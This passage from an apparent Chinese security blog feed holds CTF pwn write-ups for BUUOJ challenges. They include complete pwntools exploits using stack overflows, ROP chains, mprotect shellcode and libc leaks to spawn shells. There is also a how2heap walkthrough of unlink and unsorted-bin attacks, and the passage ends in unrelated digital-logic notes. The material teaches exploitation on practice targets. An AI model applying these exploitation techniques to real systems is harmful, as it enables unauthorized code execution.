id="buu013-get-started-3dsctf-2016"><a href="#buu013-get-started-3dsctf-2016" class="headerlink" title="buu013-get_started_3dsctf_2016"></a>buu013-get_started_3dsctf_2016</h1><p>不知道为什么3dsctf里面不止一道题在挂exp脚本调试的时候recv收不到一开始发送的字符串，很奇怪，本来这一题直接返回到后门就好了，但是因为这个怪原因不得不用mprotect在其他地方再写一个shell，原来程序里面的后门就没用上 <del>（屑）</del><br>使用mprotect函数时传入的地址参数必须页对齐，size参数也必须是页的整数倍。权限填7表示可读可写可执行。本题中要修改的主要是下面这个页的属性，然后shellcode写在.got.plt段中，尝试修改bss段，写在bss段发现不行，可能是bss段中有一些重要数据之类。<br><img src="https://img-blog.csdnimg.cn/b6188cbaf1d841cba169b5a8872f551b.png"><br>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29364</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">mprotect = elf.symbols[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">start = <span class="number">0x80eb000</span></span><br><span class="line">length = <span class="number">0x1000</span></span><br><span class="line">bss = <span class="number">0x803bf80</span></span><br><span class="line">pop3 = <span class="number">0x0809e4c5</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)</span><br><span class="line">payload += p32(mprotect)</span><br><span class="line">payload += p32(pop3)</span><br><span class="line">payload += p32(start)</span><br><span class="line">payload += p32(length)</span><br><span class="line">payload += p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(pop3)</span><br><span class="line">payload += p32(<span class="number">0</span>)<span class="comment"># stdin</span></span><br><span class="line">payload += p32(start)</span><br><span class="line">payload += p32(<span class="number">0x80</span>)</span><br><span class="line">payload += p32(start)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu014-ciscn-2019-en-2"><a href="#buu014-ciscn-2019-en-2" class="headerlink" title="buu014-ciscn_2019_en_2"></a>buu014-ciscn_2019_en_2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25743</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/usr/lib/x86_64-linux-gnu/libc-2.33.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">b&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv(<span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">put_addr = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, put_addr)</span><br><span class="line">libc_base = put_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + cyclic(<span class="number">0x50</span>+<span class="number">7</span>)</span><br><span class="line">payload += p64(<span class="number">0x4006b9</span>)<span class="comment"># ret</span></span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(sys_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your choice!&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu015-HarekazeCTF2019-baby-rop"><a href="#buu015-HarekazeCTF2019-baby-rop" class="headerlink" title="buu015-[HarekazeCTF2019]baby_rop"></a>buu015-[HarekazeCTF2019]baby_rop</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28394</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x600a90</span></span><br><span class="line">poprdi_ret = <span class="number">0x4006b3</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>, cyclic(<span class="number">0x88</span>) + p64(poprdi_ret) + p64(binsh_addr) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu016-jarvisoj-level2-x64"><a href="#buu016-jarvisoj-level2-x64" class="headerlink" title="buu016-jarvisoj_level2_x64"></a>buu016-jarvisoj_level2_x64</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25723</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400683</span></span><br><span class="line">binsh = <span class="number">0x601048</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name? &#x27;</span>, cyclic(<span class="number">0x18</span>) + p64(poprdi_ret) + p64(binsh) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ARM pwn 入门 (2)</title>
      <link href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-2/"/>
      <url>/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-2/</url>
      
        <content type="html"><![CDATA[<p><font face=汉仪唐美人>上一篇文章中笔者对ARM架构的寄存器和指令集做了简单的介绍，本文就来首杀ARM pwn题。</font></p><h1 id="buuoj-第139题-jarvisoj-typo"><a href="#buuoj-第139题-jarvisoj-typo" class="headerlink" title="buuoj 第139题 jarvisoj_typo"></a><font size=6, face=汉仪唐美人><strong>buuoj 第139题 jarvisoj_typo</strong></font></h1><p><font face=汉仪唐美人>这一题是静态编译的程序，对于ARM可执行文件，在x86架构的虚拟机上可以使用<code>qemu-arm ...</code>来执行。</font></p><p><font face=汉仪唐美人>我们首先来执行看一下这个程序有什么输出。</font></p><p><img src="https://img-blog.csdnimg.cn/e72c9ff3e6af490fb3e9fb5bf85b2243.png"></p><p><font face=汉仪唐美人>在程序一开始输出了一段字符串，我们可以在IDA中用Shift+F12来查看elf文件中所有硬编码的字符串：</font></p><p><img src="https://img-blog.csdnimg.cn/e996f980ef9941099fbbc372fc7f5200.png"></p><p><font face=汉仪唐美人>然后根据交叉引用找到该字符串被引用的位置：</font></p><p><img src="https://img-blog.csdnimg.cn/7dd8665411a44b65bdaaabdb115b85f9.png"></p><p><font face=汉仪唐美人>根据程序的输入，我们可以猜测出其中一部分库函数，如这里的write、getchar等。看上去这是一个正常的输入程序，一个typing test，如果输入的内容和程序输出相同就会继续输出一个单词等待用户输入，否则输出error。</font></p><p><img src="https://img-blog.csdnimg.cn/f8ca296275374151a59ee4f3e6e18e53.png"></p><p><font face=汉仪唐美人>这里可以推测<code>sub_8D24</code>是关键输入函数。</font></p><p><img src="https://img-blog.csdnimg.cn/cfd778369edd4f21acb4674afbdfeffb.png"></p><p><font face=汉仪唐美人>这里的input应该就是输入的缓冲区，我们需要进行调试确定到底是哪一步执行了读取用户输入的操作：qemu-arm后加-g选项指定端口，就可以通过<code>gdb-multiarch</code>进行调试。经过调试发现上图中的<code>read</code>函数就是读取的函数，且最大读取大小为512字节，这明显就造成了栈溢出。</font></p><p><img src="https://img-blog.csdnimg.cn/bcfa376ecf864b53bb35c6aff0a411bf.png"></p><p><font face=汉仪唐美人>从上图可知，覆盖返回地址需要先输入0x70字节。在elf文件中可以发现字符串<code>/bin/sh</code>:</font></p><p><img src="https://img-blog.csdnimg.cn/c1cd7531800d4bbeb88e75c98d414543.png"></p><p><font face=汉仪唐美人>引用字符串<code>/bin/sh</code>的函数就是<code>system</code>函数。因此我们可以找到<code>system</code>函数的地址为0x10BA8。需要注意ARM架构函数的调用约定：<font color=red>前4个参数保存在R0~R3，之后的参数从右至左压栈。因此要想执行<code>system(&quot;/bin/sh&quot;)</code>，就需要将寄存器R0的值修改为字符串<code>&#39;/bin/sh&#39;</code>的地址，返回地址可以通过栈溢出直接修改。考虑到这是一个静态编译的文件，很容易就可以想到使用一个简单的ROP来实现寄存器修改操作。<font></font></p><p><img src="https://img-blog.csdnimg.cn/378e8f9963554d3d830236b7a57e83b2.png"></p><p><font face=汉仪唐美人>找到合适的ROP地址为0x20904，可以在修改寄存器R0的值之后修改PC的值。现在可以编写exp了。</font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;arm&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process([<span class="string">&#x27;qemu-arm-static&#x27;</span>, <span class="string">&#x27;./typo&#x27;</span>])</span><br><span class="line">io.sendafter(<span class="string">b&#x27;quit\n&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">io.send(cyclic(<span class="number">0x70</span>) + p32(<span class="number">0x20904</span>) + p32(<span class="number">0x6c384</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x10ba8</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/67fef56492dc496c840ced2ad8631fda.png"></p><p><font face=汉仪唐美人>成功getshell。这题看来不难，只是一个简单的不能再简单的ROP。</font></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>how2heap 深入学习(5)</title>
      <link href="/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-5/"/>
      <url>/2023/02/28/how2heap-%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-5/</url>
      
        <content type="html"><![CDATA[<p>how2heap下载网址: <a href="https://github.com/shellphish/how2heap">传送门</a><br>Glibc源码查看网址：<a href="https://elixir.bootlin.com/glibc/glibc-2.23/source">传送门</a><br>参考书籍：CTF竞赛权威指南-pwn篇</p><p>测试环境：Ubuntu 16.04<br>Glibc版本：Ubuntu GLIBC 2.23-0ubuntu11.3</p><p>按照顺序，本文分析glibc 2_23文件夹中的第17~19个源码，这也是glibc 2.23 how2heap给出的最后3个源码。<br>如果本文的分析有任何错漏之处，还请各位读者不吝赐教，不胜感激。</p><h1 id="17-unsafe-unlink"><a href="#17-unsafe-unlink" class="headerlink" title="17. unsafe_unlink"></a>17. unsafe_unlink</h1><p>众所周知，unlink是一种常用的堆漏洞利用方式，最为常见的利用场景是可以进行unlink而且堆指针保存在全局变量中。（例题：XCTF攻防世界-Noleak）</p><p>这种漏洞利用方式不是借助于fastbin完成，因此需要申请较大的堆块。在源码中定义了一个全局变量chunk0_ptr，为其分配了一个大小为0x90的堆块。之后又分配了一个0x90堆块chunk1_ptr，这也是接下来被攻击的chunk。设第一个chunk的起始地址为x，全局变量的地址为y，现在的内存情况如下：</p><table><thead><tr><th align="center">addr</th><th align="center">+0x0</th><th align="center">+0x8</th></tr></thead><tbody><tr><td align="center">x</td><td align="center">-</td><td align="center">(size) 0x91</td></tr><tr><td align="center">…</td><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">x + 0x90</td><td align="center">-</td><td align="center">(size) 0x91</td></tr><tr><td align="center">…</td><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">y</td><td align="center">x</td><td align="center">-</td></tr></tbody></table><p>接下来，我们需要在chunk0_ptr的chunk中伪造一个chunk，为接下来的unlink做准备。伪造后的堆区长这样：</p><table><thead><tr><th align="center">addr</th><th align="center">+0x0</th><th align="center">+0x8</th></tr></thead><tbody><tr><td align="center">x</td><td align="center">-</td><td align="center">(size) 0x91</td></tr><tr><td align="center">x+0x10</td><td align="center">-</td><td align="center">-</td></tr><tr><td align="center">x+0x20</td><td align="center"><font color=red>(fake chunk fd) y-0x18</font></td><td align="center"><font color=red>(fake chunk bk) y-0x10</font></td></tr><tr><td align="center">…</td><td align="center">…</td><td align="center">…</td></tr><tr><td align="center">x+0x90</td><td align="center"><font color=red>(fake prev size) 0x80</font></td><td align="center"><font color=red>(size) 0x90</font></td></tr><tr><td align="center">…</td><td align="center">…</td><td align="center">…</td></tr></tbody></table><p>注意：这里将第二个chunk的prev_in_use位修改为了0，fake prev size就是假chunk的大小，将fake prev size设为0x80是为了让后面一个chunk能够通过prev chunk找到我们构造的假chunk。fake chunk的假fd和bk指针的构造很重要，后面会用到。</p><p>接下来，我们将第二个chunk释放，释放时第二个chunk会和第一个chunk里面的假chunk合并。这样就造成了堆块的重叠。</p><p>下面解释一下为什么这之后能够进行任一地址写。</p><h2 id="为什么要设置fd-x3D-y-0x18，bk-x3D-y-0x10？"><a href="#为什么要设置fd-x3D-y-0x18，bk-x3D-y-0x10？" class="headerlink" title="为什么要设置fd&#x3D;y-0x18，bk&#x3D;y-0x10？"></a>为什么要设置fd&#x3D;y-0x18，bk&#x3D;y-0x10？</h2><p>这是为了绕过libc的检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;      \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">        FD-&gt;bk = BK;      \</span></span><br><span class="line"><span class="meta">        BK-&gt;fd = FD;      \</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)      \</span></span><br><span class="line"><span class="meta">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \</span></span><br><span class="line"><span class="meta">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action,      \</span></span><br><span class="line"><span class="meta">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    \</span></span><br><span class="line"><span class="meta">       P, AV);      \</span></span><br><span class="line"><span class="meta">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == NULL) &#123;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      \</span></span><br><span class="line"><span class="meta">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \</span></span><br><span class="line"><span class="meta">                  &#125;      \</span></span><br><span class="line"><span class="meta">              &#125; <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \</span></span><br><span class="line"><span class="meta">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \</span></span><br><span class="line"><span class="meta">              &#125;      \</span></span><br><span class="line"><span class="meta">          &#125;      \</span></span><br><span class="line"><span class="meta">      &#125;      \</span></span><br><span class="line"><span class="meta">&#125;</span></span><br></pre></td></tr></table></figure><p>在unlink的源码中有一个检查是：<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code>。因此需要保证此chunk的fd的bk等于bk的fd等于此chunk。由于C语言按照偏移获取结构体的成员，fd的偏移为0x10，bk的偏移为0x18。在全局变量中保存的就是第一个chunk，将fd指向y-0x18，那么fd-&gt;bk就为y；将bk指向y-0x10，那么bk-&gt;fd就为y。y中保存的正好就是x，这也就成功绕过了检查。检查通过之后，heap会进行堆块的合并操作，同时修改全局变量指针的值。</p><p>因为P &#x3D; x，FD &#x3D; y - 0x18，BK &#x3D; y - 0x10，在语句<code>BK-&gt;fd = FD;</code>执行之后，全局变量的chunk0_ptr的值就变成了y-0x18。这样，我们就可以通过chunk0_ptr对其本身进行修改，此时可将chunk0_ptr的值修改为任意值。<font color=red>注意：不要被绕晕了，这个时候，全局变量保存的不再是第一个chunk的起始地址，而是通过unlink操作被修改了，但是libc误认为这里仍然保存的是一个chunk的指针，因此可以让这个全局变量自己修改自己。</font>在源码中，将这里修改到了栈区，之后再次使用这个指针就可以修改栈区的内容了。</p><h1 id="18-unsorted-bin-attack"><a href="#18-unsorted-bin-attack" class="headerlink" title="18. unsorted_bin_attack"></a>18. unsorted_bin_attack</h1><p>这种攻击方式实际上在前面已经提到过，比较简单。将第一个unsorted bin chunk的bk指针修改为我们想要写的地址附近，然后把这个chunk分配回去就能够让unsorted bin head指向我们想要的地址，然后再调用malloc函数就能分配一块内存到我们想要的地址了。</p><h1 id="19-unsorted-bin-into-stack"><a href="#19-unsorted-bin-into-stack" class="headerlink" title="19. unsorted_bin_into_stack"></a>19. unsorted_bin_into_stack</h1><p>也是unsorted bin attack。首先分配两个0x110的chunk，后一个防止top chunk影响。然后释放第一个chunk。接下来在堆块中伪造一个chunk，设置size为0x110，bk为这个假堆块头。接下来是漏洞关键操作：修改第一个chunk的size和bk。程序将第一个chunk的size改小为0x20，bk改为假chunk。将size改小是为了后面分配0x100大小的堆块时能够跳过这个堆块直接分配到栈上的假chunk。</p><p>后面调用malloc函数时，首先从unsorted bin中查找到了第一个chunk。但是因为这个chunk的大小被改小了，libc判定空间不足，就将这个chunk移到了small bins中。之后检查到了假chunk并将其返回。既然chunk已经分配到了栈上，那么就可以直接修改main函数的返回地址（如果有canary可能不能直接修改）并劫持控制流。</p><p>至此，how2heap glibc 2.23的所有源码已经分析完成。之后会进行glibc 2.27源码的分析。实际上glibc 2.23和2.27的最大区别就是tcache。其他方面区别不大，因此glibc 2.27的分析可能会短很多。实际上，在分析调试how2heap源码中，有很多地方仍然没有深入到原子操作去进行。待到我的水平再上一层时可能会来解决这一部分问题。但现在，所有给出的堆漏洞已经了解其利用方法，通过做题可以加深我们对漏洞利用方式的判断与应用。谢谢。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数字逻辑 Chapter 3——门电路和触发器</title>
      <link href="/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-3%E2%80%94%E2%80%94%E9%97%A8%E7%94%B5%E8%B7%AF%E5%92%8C%E8%A7%A6%E5%8F%91%E5%99%A8/"/>
      <url>/2023/02/28/%E6%95%B0%E5%AD%97%E9%80%BB%E8%BE%91-Chapter-3%E2%80%94%E2%80%94%E9%97%A8%E7%94%B5%E8%B7%AF%E5%92%8C%E8%A7%A6%E5%8F%91%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="3-1-数字集成电路分类"><a href="#3-1-数字集成电路分类" class="headerlink" title="3.1 数字集成电路分类"></a>3.1 数字集成电路分类</h1><p>集成电路进行数字系统设计的优点：可靠性高、可维护性好、功耗低、成本低等<br>数字集成电路根据采用的半导体期间可以分为两类：</p><ol><li>双极型集成电路：采用双极型半导体期间作为元件。特点：速度快、负载能力强，但功耗较大、集成度较低。</li><li>单极型集成电路(MOS)：采用金属、一氧化物半导体场效应管作为元件。特点：结构简单、制造方便、集成度高、功耗低，但速度较慢</li></ol><h1 id="3-2-半导体期间开关特性"><a href="#3-2-半导体期间开关特性" class="headerlink" title="3.2 半导体期间开关特性"></a>3.2 半导体期间开关特性</h1><h2 id="3-2-1-晶体二极管"><a href="#3-2-1-晶体二极管" class="headerlink" title="3.2.1 晶体二极管"></a>3.2.1 晶体二极管</h2><p>正向特性：有门槛电压，即二极管开始导通的正向电压，又称阈值电压。<br>反向特性：在反向电压作用下处于截止状态，反向电阻大，相当于断开。</p><h2 id="3-2-2-晶体三极管"><a href="#3-2-2-晶体三极管" class="headerlink" title="3.2.2 晶体三极管"></a>3.2.2 晶体三极管</h2><p>截止、放大、饱和3种状态。</p><h1 id="3-3-逻辑门电路"><a href="#3-3-逻辑门电路" class="headerlink" title="3.3 逻辑门电路"></a>3.3 逻辑门电路</h1><h2 id="3-3-1-简单逻辑门电路"><a href="#3-3-1-简单逻辑门电路" class="headerlink" title="3.3.1 简单逻辑门电路"></a>3.3.1 简单逻辑门电路</h2><ol><li>与门<br><img src="https://img-blog.csdnimg.cn/6d020de8ccee4fa09ed3399b22af9541.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_19,color_FFFFFF,t_70,g_se,x_16"></li><li>或门</li></ol><p><img src="https://img-blog.csdnimg.cn/cd1bb4e99ce245719a97b3d326214998.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>3. 非门</p><p><img src="https://img-blog.csdnimg.cn/180d7b1cebd346b8aac755f2be93b748.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_18,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="3-3-2-TTL集成逻辑门电路和CMOS电路"><a href="#3-3-2-TTL集成逻辑门电路和CMOS电路" class="headerlink" title="3.3.2 TTL集成逻辑门电路和CMOS电路"></a>3.3.2 TTL集成逻辑门电路和CMOS电路</h2><p>TTL功耗大、集成度低，广泛用户中小规模集成电路中<br>常用TTL集成电路芯片有74系列</p><p>两种特殊门电路：</p><ol><li>集电极开路门(OC门)<br> 一种输出端可以直接相互连接的特殊逻辑门，可以实现“线与”逻辑<br><img src="https://img-blog.csdnimg.cn/8659ff2637d04c90b5e436f0fdfc1f8b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_19,color_FFFFFF,t_70,g_se,x_16"></li><li>三态输出门(TS门)<br> 常用于数字系统中总线传输控制，可以让共享总线的输入输出设备根据控制信号从总线获取或向总线发送数据<br> 三种输出状态：高电平、低电平、高阻</li></ol><p><img src="https://img-blog.csdnimg.cn/065e8e538d2c4f90b422f5f6c9bc68fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>正逻辑与负逻辑<br>正逻辑：用高电平表示逻辑1<br>负逻辑：用低电平表示逻辑1</p><h1 id="3-4-触发器"><a href="#3-4-触发器" class="headerlink" title="3.4 触发器"></a>3.4 触发器</h1><p>触发器：一种具有记忆功能的电子器件，用于存储一位二进制信息<br>特点：</p><ul><li>有两个互补的输出端$Q,\bar Q$</li><li>有两个稳定状态，$Q&#x3D;1,\bar 